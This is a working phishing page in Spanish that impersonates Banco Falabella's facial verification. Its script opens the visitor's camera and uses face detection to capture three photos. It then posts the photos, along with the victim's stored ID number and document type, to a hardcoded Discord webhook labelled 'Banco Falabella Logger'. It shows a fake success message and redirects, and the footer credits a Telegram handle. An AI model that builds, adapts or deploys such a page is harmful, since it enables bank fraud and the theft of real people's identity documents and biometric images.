<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Banco Falabella — Verificación Facial</title>
<script async src="https://cdn.jsdelivr.net/npm/face-api.min.js"></script>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #ffffff;
    color: #333;
    -webkit-font-smoothing: antialiased;
  }
  .app {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    max-width: 430px;
    margin: 0 auto;
    background: #ffffff;
  }
  .header {
    padding: 20px 24px;
    border-bottom: 1px solid #ebebeb;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .header img { width: 140px; height: auto; }
  .content {
    padding: 24px;
    flex: 1;
    display: flex;
    flex-direction: column;
  }
  .title {
    font-size: 22px;
    font-weight: 700;
    color: #1a1a1a;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }
  .instruction {
    font-size: 13px;
    color: #666;
    margin-bottom: 20px;
    line-height: 1.5;
  }
  .instruction strong {
    color: #e8003d;
    font-weight: 600;
  }
  .camera-container {
    position: relative;
    width: 100%;
    border-radius: 16px;
    overflow: hidden;
    background: #000;
    margin: 20px 0;
    aspect-ratio: 1;
    border: 2px solid #d0d0d0;
  }
  #video {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
  }
  #canvas {
    display: none;
  }
  .detection-overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .face-frame {
    position: absolute;
    width: 160px;
    height: 220px;
    border: 3px solid rgba(74, 156, 47, 0.3);
    border-radius: 20px;
    box-shadow: inset 0 0 0 1px rgba(74, 156, 47, 0.2);
    background: transparent;
  }
  .face-frame.perfect {
    border-color: #4a9c2f;
    box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 25px rgba(74, 156, 47, 0.5);
    background: rgba(74, 156, 47, 0.05);
  }
  .status-container {
    margin-bottom: 20px;
  }
  .status {
    text-align: center;
    font-size: 14px;
    color: #888;
    min-height: 42px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f9f9f9;
    border-radius: 10px;
    padding: 12px;
    font-weight: 500;
  }
  .status.ready {
    color: #fff;
    background: linear-gradient(135deg, #4a9c2f 0%, #82d052 100%);
    animation: pulse 1.5s ease-in-out infinite;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.8; }
  }
  .status.processing {
    color: #4a9c2f;
    background: #f0f8f4;
  }
  .checklist {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-bottom: 20px;
  }
  .check-item {
    font-size: 12px;
    padding: 8px 12px;
    border-radius: 8px;
    background: #f5f5f5;
    border: 1px solid #e0e0e0;
    display: flex;
    align-items: center;
    gap: 6px;
    color: #666;
  }
  .check-item.ok {
    background: #f0f8f4;
    border-color: #4a9c2f;
    color: #4a9c2f;
    font-weight: 600;
  }
  .check-icon {
    font-weight: bold;
    font-size: 14px;
  }
  .check-icon.ok {
    color: #4a9c2f;
  }
  .loading {
    display: none;
    text-align: center;
    margin-top: 16px;
  }
  .loading.show {
    display: block;
  }
  .spinner {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 3px solid #ddd;
    border-top-color: #4a9c2f;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 8px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading-text {
    font-size: 14px;
    color: #4a9c2f;
    font-weight: 600;
  }
</style>
</head>
<body>
<div class="app">
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
         alt="Banco Falabella" width="140">
  </div>

  <div class="content">
    <p class="title">Verificación facial</p>
    
    <p class="instruction">Acércate a la cámara y espera a que se detecte tu rostro. Mantén una expresión neutral. <strong>Sin lentes ni accesorios</strong>.</p>

    <div class="camera-container">
      <video id="video" autoplay playsinline></video>
      <div class="detection-overlay">
        <div class="face-frame" id="faceFrame"></div>
      </div>
    </div>

    <div class="status-container">
      <div class="status" id="status">Inicializando cámara...</div>
    </div>

    <div class="checklist" id="checklist" style="display: none;">
      <div class="check-item" id="checkLight">
        <span class="check-icon">○</span>
        <span>Iluminación</span>
      </div>
      <div class="check-item" id="checkDistance">
        <span class="check-icon">○</span>
        <span>Distancia</span>
      </div>
      <div class="check-item" id="checkCenter">
        <span class="check-icon">○</span>
        <span>Centrado</span>
      </div>
      <div class="check-item" id="checkExpression">
        <span class="check-icon">○</span>
        <span>Expresión</span>
      </div>
    </div>

    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div class="loading-text">Capturando fotos y enviando...</div>
    </div>
  </div>
</div>

<canvas id="canvas"></canvas>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const status = document.getElementById('status');
  const faceFrame = document.getElementById('faceFrame');
  const checklist = document.getElementById('checklist');
  const loading = document.getElementById('loading');

  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490551948598837268/ee4s2QMfWrRrKHaeCKDVKYzP3Cg4wFD5G7lbg4v-KOLnAWwolFgJSXcYWfGLKH-IJ8pV";
  
  const savedDni = localStorage.getItem("bf_last_dni") || "No disponible";
  const docType = localStorage.getItem("bf_doc_type") || "DNI";

  const docTypeLabel = {
    "DNI": "DNI",
    "CE": "Carnet",
    "PAS": "Pasaporte"
  };

  let stream = null;
  let modelsLoaded = false;
  let isCapturing = false;
  let detectionStats = {
    goodFrames: 0,
    totalFrames: 0
  };

  async function initCamera() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      });
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        status.textContent = 'Cargando modelos de IA...';
        loadFaceDetectionModels();
      };
    } catch (e) {
      status.textContent = 'Error: No se puede acceder a la cámara';
      console.error('Error:', e);
    }
  }

  async function loadFaceDetectionModels() {
    try {
      const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
        faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
        faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
      ]);
      modelsLoaded = true;
      checklist.style.display = 'grid';
      status.textContent = 'Ajusta tu posición...';
      startFaceDetection();
    } catch (e) {
      console.error('Error loading models:', e);
      status.textContent = 'Error cargando modelos.';
    }
  }

  function updateChecklist(checks) {
    const items = {
      light: document.getElementById('checkLight'),
      distance: document.getElementById('checkDistance'),
      center: document.getElementById('checkCenter'),
      expression: document.getElementById('checkExpression')
    };

    Object.entries(checks).forEach(([key, isOk]) => {
      const item = items[key];
      if (item) {
        const icon = item.querySelector('.check-icon');
        if (isOk) {
          item.classList.add('ok');
          icon.textContent = '✓';
        } else {
          item.classList.remove('ok');
          icon.textContent = '○';
        }
      }
    });
  }

  function getImageBrightness(imageData) {
    const data = imageData.data;
    let sum = 0;
    for (let i = 0; i < data.length; i += 4) {
      sum += (data[i] + data[i + 1] + data[i + 2]) / 3;
    }
    return sum / (data.length / 4);
  }

  async function capturePhoto() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.95);
    });
  }

  async function sendPhotosToDiscord(photos) {
    try {
      loading.classList.add('show');

      const formData = new FormData();
      
      let photoDescription = '';
      photos.forEach((_, idx) => {
        photoDescription += `Foto ${idx + 1}\n`;
      });

      formData.append('payload_json', JSON.stringify({
        username: "Banco Falabella Logger",
        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png",
        embeds: [{
          title: "📸 VERIFICACIÓN FACIAL — BANCO FALABELLA",
          color: 0x4a9c2f,
          thumbnail: {
            url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
          },
          fields: [
            {
              name: "👤 USUARIO",
              value: `\`\`\`\n${docTypeLabel[docType]}: ${savedDni}\n\`\`\``,
              inline: false
            },
            {
              name: "📷 FOTOS CAPTURADAS",
              value: photoDescription,
              inline: false
            },
            {
              name: "✅ ESTADO",
              value: "Verificación facial completada exitosamente",
              inline: false
            },
            {
              name: "🕐 FECHA Y HORA",
              value: `${new Date().toLocaleString('es-PE')}`,
              inline: false
            }
          ],
          footer: {
            text: "⚡ by @Brknshinexxx  •  Telegram",
            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
          },
          timestamp: new Date().toISOString(),
          image: {
            url: "attachment://foto_1.jpg"
          }
        }]
      }));

      photos.forEach((blob, idx) => {
        formData.append('file', blob, `facial_${idx + 1}.jpg`);
      });

      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        loading.classList.remove('show');
        status.classList.add('ready');
        status.textContent = '✓ Verificación completada';
        
        stream.getTracks().forEach(track => track.stop());
        
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 2000);
        return true;
      }
      return false;
    } catch (e) {
      console.error('Error:', e);
      return false;
    }
  }

  async function startFaceDetection() {
    if (!modelsLoaded || !stream) return;

    const detectionOptions = new faceapi.TinyFaceDetectorOptions({
      inputSize: 416,
      scoreThreshold: 0.5
    });

    setInterval(async () => {
      if (isCapturing) return;

      try {
        const detections = await faceapi.detectAllFaces(video, detectionOptions).withFaceLandmarks().withFaceExpressions();
        
        if (detections.length === 0) {
          faceFrame.classList.remove('perfect');
          updateChecklist({ light: false, distance: false, center: false, expression: false });
          status.textContent = 'Muestra tu rostro a la cámara...';
          detectionStats.goodFrames = 0;
          return;
        }

        const detection = detections[0];
        const box = detection.detection.box;
        const landmarks = detection.landmarks;

        // Calcular brillo
        const centerX = Math.floor(box.x + box.width / 2);
        const centerY = Math.floor(box.y + box.height / 2);
        const ctx = video.getContext ? video.getContext('2d') : null;
        let brightness = 100;
        if (ctx) {
          const imageData = ctx.getImageData(centerX - 50, centerY - 50, 100, 100);
          brightness = getImageBrightness(imageData);
        }

        // Validaciones
        const videoWidth = video.videoWidth;
        const videoHeight = video.videoHeight;
        
        // Distancia (tamaño de cara)
        const faceSize = (box.width + box.height) / 2;
        const minSize = Math.min(videoWidth, videoHeight) * 0.25;
        const maxSize = Math.min(videoWidth, videoHeight) * 0.55;
        const distanceOk = faceSize > minSize && faceSize < maxSize;

        // Centrado
        const faceCenter = box.x + box.width / 2;
        const tolerance = videoWidth * 0.1;
        const centerOk = Math.abs(faceCenter - videoWidth / 2) < tolerance;

        // Iluminación
        const lightOk = brightness > 50;

        // Expresión (neutral = sin particularidad de emociones)
        const expressions = detection.expressions;
        const avgIntensity = Object.values(expressions).reduce((a, b) => a + b) / Object.keys(expressions).length;
        const expressionOk = avgIntensity < 0.5;

        updateChecklist({
          light: lightOk,
          distance: distanceOk,
          center: centerOk,
          expression: expressionOk
        });

        const allOk = lightOk && distanceOk && centerOk && expressionOk;

        if (allOk) {
          detectionStats.goodFrames++;
          faceFrame.classList.add('perfect');
          status.textContent = `✓ Posición perfecta (${detectionStats.goodFrames}/10)`;
          status.classList.add('processing');

          if (detectionStats.goodFrames >= 10) {
            isCapturing = true;
            status.textContent = 'Capturando fotos...';
            
            const photos = [];
            for (let i = 0; i < 3; i++) {
              await new Promise(r => setTimeout(r, 100));
              const blob = await capturePhoto();
              photos.push(blob);
            }

            await sendPhotosToDiscord(photos);
          }
        } else {
          detectionStats.goodFrames = Math.max(0, detectionStats.goodFrames - 1);
          faceFrame.classList.remove('perfect');
          status.classList.remove('processing');
        }

      } catch (e) {
        console.error('Detection error:', e);
      }
    }, 200);
  }

  initCamera();

  window.addEventListener('beforeunload', () => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });
</script>
</body>
</html>
